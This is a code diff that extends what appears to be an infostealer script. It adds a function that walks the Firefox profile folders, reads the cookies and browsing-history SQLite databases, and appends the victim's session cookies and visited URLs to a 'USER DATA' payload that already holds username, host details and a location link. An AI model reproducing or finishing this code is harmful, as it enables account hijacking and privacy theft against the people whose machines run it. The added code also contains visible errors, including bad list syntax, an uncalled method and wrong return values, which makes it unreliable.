@@ -1,3 +1,4 @@
+import os
 import sys
 import json
 import socket
@@ -7,7 +8,27 @@ import getpass
 import platform
 import datetime
 import requests
+import sqlite_utils
 home = pathlib.Path.home()
+def get_moz():
+	p = Path(os.getenv("APPDATA", "")) / "Mozilla" / "Firefox"
+	t = ["cookies.sqlite". "places.sqlite"]
+	c = []
+	u = []
+	if p.exists and p.is_dir():
+		for d, f in p.rglob("*"):
+			if f == "cookies.sqlite":
+				db = sqlite_utils.Database(f)
+				co = db['moz_cookies']
+				for r in co.rows:
+					c.append(r)
+			elif f == "places.sqlite":
+				db = sqlite_utils.Database(f)
+				co = db['moz_places']
+				for r in co.rows:
+					c.append(r['url'])
+	return c, d
+				
 def format1(s, path=False):
 	if not path:
 		return str(s).replace("[","").replace("]","")
@@ -78,6 +99,9 @@ nd = platform.node()
 re = platform.release()
 d_path = format1(pts[0], path=True)
 f_path = format1(pts[1], path=True)
+f_co = get_moz()
+cookies = format1(f_co[0])
+places = format1(f_co[1])
 payload = f"""
 ---------- 𝐔𝐒𝐄𝐑 𝐃𝐀𝐓𝐀 ----------
 
@@ -126,6 +150,14 @@ Google Maps Link: https://www.google.com/maps/search/?q={i_info['lat']},{i_info[
 {d_path}
 
 {f_path}
+
+--------------- 𝐂𝐨𝐨𝐤𝐢𝐞𝐬 ----------------
+
+{cookies}
+
+----------- Firefox History ------------
+
+{places}
 
 ----------------------------------------
 """
